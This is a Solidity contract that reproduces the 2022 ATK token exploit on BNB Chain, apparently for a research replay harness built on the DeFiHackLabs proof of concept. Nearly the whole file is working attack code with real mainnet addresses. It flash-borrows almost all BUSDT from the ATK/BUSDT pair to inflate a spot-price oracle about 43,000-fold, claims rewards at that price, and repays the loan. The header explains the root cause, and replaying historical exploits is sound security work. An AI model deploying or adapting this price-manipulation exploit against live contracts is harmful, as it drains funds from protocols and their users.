// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// Synthetic standalone exploit for the EVM Playground (2022-10-ATK).
//
// The DeFiHackLabs PoC (test/ATK_exp.sol) runs the attack INLINE in the Foundry
// `ContractTest` (the `pancakeCall` flash-swap callback lives on the test itself),
// so there is no standalone contract to deploy. The reward contract's
// `claimToken1()` checks `msg.sender == EXPLOIT_CONTRACT` (0xD7ba…0231), so the
// attack MUST execute AT that historical address. This contract is therefore a
// faithful self-contained copy of the inline attack, etched at EXPLOIT_CONTRACT
// via vm.etch (runtime code only), so the recorder calls run() as that address.
//
// Logic and constants are copied verbatim from test/ATK_exp.sol.
//
// Root cause: ATK.getPrice() is a raw spot-price read of the AMM reserves
// (ATK_reserve * 1e18 / BUSDT_reserve). Flash-borrowing nearly all the pair's
// BUSDT collapses the divisor and inflates the price ~43,000×; the reward
// contract then sizes the payout off that manipulated price.

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
}

interface IWBNB {
    function deposit() external payable;
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
}

interface IUniswapV2Router {
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}

interface IUniswapV2Pair {
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
}

contract ATKDrain {
    IWBNB constant WBNB = IWBNB(payable(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c));
    IERC20 constant ATK = IERC20(0x9cB928Bf50ED220aC8f703bce35BE5ce7F56C99c);
    IERC20 constant BUSDT = IERC20(0x55d398326f99059fF775485246999027B3197955);
    IUniswapV2Router constant PS_ROUTER = IUniswapV2Router(0x10ED43C718714eb63d5aA57B78B54704E256024E);
    IUniswapV2Pair constant ATK_BUSDT_PAIR = IUniswapV2Pair(0xd228fAee4f73a73fcC73B6d9a1BD25EE1D6ee611);
    address constant REWARD_CONTRACT = 0x96bF2E6CC029363B57Ffa5984b943f825D333614;

    uint256 private swapamount;

    // run() mirrors testExploit(): fund the flash fee with WBNB→BUSDT, flash-borrow
    // ~all BUSDT from the ATK/BUSDT pair, claim at the manipulated price inside the
    // callback, then repay the flash loan.
    function run() external payable {
        // Step 1: fund the 0.25% flash fee — deposit WBNB and swap to BUSDT.
        WBNB.deposit{value: 2 ether}();
        _wbnbToBUSDT();

        // Step 2: flash-borrow all but 3 BUSDT (leaving a tiny nonzero divisor so
        // getPrice() does not revert). The non-empty `data` triggers pancakeCall.
        swapamount = BUSDT.balanceOf(address(ATK_BUSDT_PAIR)) - 3 * 1e18;
        ATK_BUSDT_PAIR.swap(swapamount, 0, address(this), new bytes(1));
    }

    // PancakeSwap flash-swap callback — runs WHILE BUSDT-in-pair ≈ 3, so the ATK
    // price is inflated ~43,000×. Mirrors ContractTest.pancakeCall().
    function pancakeCall(address, uint256, uint256, bytes calldata) external {
        // Step 3: claim at the manipulated price. Because this contract is etched
        // AT EXPLOIT_CONTRACT, msg.sender to the reward contract is exactly the
        // attacker address it expects (no vm.prank needed).
        (bool ok,) = REWARD_CONTRACT.call(abi.encodeWithSignature("claimToken1()"));
        require(ok, "claimToken1() failed");

        // Step 4: repay the flash loan (borrowed × 10000/9975 + 1000 dust for k).
        BUSDT.transfer(address(ATK_BUSDT_PAIR), swapamount * 10_000 / 9975 + 1000);
    }

    function _wbnbToBUSDT() internal {
        WBNB.approve(address(PS_ROUTER), type(uint256).max);
        address[] memory path = new address[](2);
        path[0] = address(WBNB);
        path[1] = address(BUSDT);
        PS_ROUTER.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            WBNB.balanceOf(address(this)), 0, path, address(this), block.timestamp
        );
    }
}
